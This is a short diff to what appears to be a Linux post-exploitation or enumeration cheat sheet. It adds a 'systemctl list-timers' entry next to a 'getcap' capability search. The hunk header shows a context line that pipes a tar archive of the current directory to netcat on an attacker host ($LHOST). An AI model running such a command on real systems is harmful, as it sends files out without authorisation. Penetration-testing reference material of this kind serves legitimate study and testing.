@@ -96,3 +96,8 @@ tar -cf - . | nc $LHOST 1337
 ```bash
 getcap -r / 2>/dev/null
 ```
+
+# list systemd timers
+```bash
+systemctl list-timers
+```
